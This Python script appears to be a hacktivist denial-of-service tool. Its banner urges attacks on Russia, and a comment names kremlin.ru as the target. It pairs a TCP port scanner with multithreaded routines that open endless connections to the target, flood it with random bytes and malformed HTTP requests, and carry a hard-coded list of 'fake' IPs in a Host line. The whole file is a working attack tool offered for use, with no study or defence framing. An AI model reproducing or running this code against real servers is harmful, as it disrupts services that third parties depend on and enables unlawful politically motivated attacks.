# Target URL http://www.kremlin.ru/
print("""
<<------Glory to Ukraine!!------>>
[$]Fire Tashiro cannons in Russia!!
 --------------------------------
 URL Scan And Attack!!
 Server Type TCP
 Target URL http://www.kremlin.ru/
 --------------------------------
[!]Warning: Please don't use it 
 outside of Russia.
<=====================>
[@]Peace to the world.
 by A liberalist
<=====================>
<<------------------------------>>
\n""")
import gc
import sys
import random
import threading
from socket import *
from urllib.parse import urlparse
#Full Scan
def Scanfull(url):
	text = urlparse(url)
	texturl = text.netloc
	target = gethostbyname(texturl)
	print('<<---Port Full Scan--->>\n')
	print('Target URL : ' + url + '\n')
	print('Target IP : ' + target + '\n')
	print('<<-------------------->>\n')
	for port in range(0,65535):
		s = socket(AF_INET,SOCK_STREAM)
		t = s.connect_ex((target,port))
		s.close()
		if t == 0 :
			print('Open %d Port!!' % (port))
			gc.collect()
		else:
			print('Cannot Open %d Port' % (port))
			gc.collect()
#List Scan
def Scanlist(url):
	text = urlparse(url)
	texturl = text.netloc
	target = gethostbyname(texturl)
	portdate = [
		20,21,23,67,70,79,111,
		137,138,139,443,512,513,
		520,1080,2049,4000,
		6000,6063,7070,8080,
		26000,27910
		]
	print('<<---Port List Scan--->>\n')
	print('Target URL : ' + url + '\n')
	print('Target IP : ' + target + '\n')
	print('List : ' , portdate , '\n')
	print('<<-------------------->>\n')
	point = 0
	for port in portdate:
		s = socket(AF_INET,SOCK_STREAM)
		t = s.connect_ex((target,portdate[point]))
		point = point + 1
		s.close()
		if t == 0 :
			print('Open ' , port , ' Port!!')
			gc.collect()
		else:
			print('Cannot Open ' , port , ' Port')
			gc.collect()
#Choose Scan			
def Sacnchoose(url,port1,port2):
	text = urlparse(url)
	texturl = text.netloc
	target = gethostbyname(texturl)
	print('<<---Port Choose Scan--->>\n')
	print('Target URL : ' + url + '\n')
	print('Target IP : ' + target + '\n')
	print('<-Choose Port->\n')
	print('Beginning : ' , port1 , '\n')
	print('End : ' , port2 , '\n')
	print('<<---------------------->>\n')
	port2_a = port2 + 1
	for port in range(port1,port2_a):
		s = socket(AF_INET,SOCK_STREAM)
		t = s.connect_ex((target,port))
		s.close()
		if t == 0 :
			print('Open %d Open!!' % (port))
			gc.collect()
		else:
			print('Cannot Open %d Open' % (port))
			gc.collect()
#Single Attack	
def SingleAttack(url,port,ra,date):
	text = urlparse(url)
	texturl = text.netloc
	target = gethostbyname(texturl)
	fake_ipdate = [
		'105.29.64.195','103.146.30.10',
		'109.70.189.51','103.156.248.31',
		'113.74.26.115','129.18.180.224'
		]
	fake_ip = random.choice(fake_ipdate)
	bit = random._urandom(date)
	while True:
		try:
			s = socket(AF_INET,SOCK_STREAM)
			s.connect((target,port))
			s.send(bit)
			s.sendto(('GET /' + target + 'HTTP/1.1\r\n').encode('ascii'),(target,port))
			s.sendto(('Host; ' + fake_ip + '\r\n\r\n').encode('ascii'),(target,port))
			for i in range(ra):#Range Input
				s.send(bit)
				s.sendto(('GET /' + target + 'HTTP/1.1\r\n').encode('ascii'),(target,port))
				s.sendto(('Host; ' + fake_ip + '\r\n\r\n').encode('ascii'),(target,port))
			print('<-$Attack$->')
			gc.collect()
		except:
			s.close()
			print('<-!Attack Error!->')
			gc.collect()
#Random Attack			
def RandomAttack(url,ra,date):
	text = urlparse(url)
	texturl = text.netloc
	target = gethostbyname(texturl)
	fake_portdate = [
		20,21,23,67,70,79,111,
		137,138,139,512,513,
		520,1080,2049,4000,
		6000,6063,7070,8080,
		26000,27910
		]
	fake_ipdate = [
		'105.29.64.195','103.146.30.10',
		'109.70.189.51','103.156.248.31',
		'113.74.26.115','129.18.180.224'
		]
	bit = random._urandom(date)
	fake_port = random.choice(fake_portdate)
	fake_ip = random.choice(fake_ipdate)
	while True:
		try:
			s = socket(AF_INET,SOCK_STREAM)
			s.connect((target,fake_port))
			s.send(bit)
			s.sendto(('GET /' + target + 'HTTP/1.1\r\n').encode('ascii'),(target,fake_port))
			s.sendto(('Host; ' + fake_ip + '\r\n\r\n').encode('ascii'),(target,fake_port))
			for i in range(ra):#Range Input
				s.send(bit)
				s.sendto(('GET /' + target + 'HTTP/1.1\r\n').encode('ascii'),(target,fake_port))
				s.sendto(('Host; ' + fake_ip + '\r\n\r\n').encode('ascii'),(target,fake_port))
			print('<-$Attack$->')
			gc.collect()
		except:
			s.close()
			print('<-!Attack Error!->')
			gc.collect()
if __name__ == '__main__':
	try:
		target = str(input('Target URL Input : '))
		text = int(input('URL Scan(0),URL Attack(1) : '))
		if text == 0 :
			text_a = int(input('FullScan(0),ListScan(1),ChooseScan(2) : '))
			if text_a == 0:
				Scanfull(target)
			if text_a == 1 :
				Scanlist(target)
			if text_a == 2 :
				port1 = int(input('Port Beginning Input : '))
				port2 = int(input('Port End Input : '))
				Sacnchoose(target,port1,port2)
			else:
				pass
		elif text == 1 :
			text_b = int(input('SingleAttack(0),RandomAttack(1) : '))
			if text_b == 0 :
				port = int(input('Target Port Input : '))
				ra = int(input('Range Input : '))
				tha = int(input('Threads Input : '))
				date = int(input('Send Date(Bit) Input (1 ~ 1024) : '))
				for i in range(tha):#Threads Input
					th = threading.Thread(target=SingleAttack,args=(target,port,ra,date,))
					th.start()
			if text_b == 1 :
				ra = int(input('Range Input : '))
				tha = int(input('Threads Input : '))
				date = int(input('Send Date(Bit) Input (1 ~ 1024) : '))
				for i in range(tha):#Threads Input
					th = threading.Thread(target=RandomAttack,args=(target,ra,date,))
					th.start()
			else:
				pass
	except:
		print('Finnsh!!')
		sys.exit()
#Glory to all the people in the world!!
#Love & Peace!!
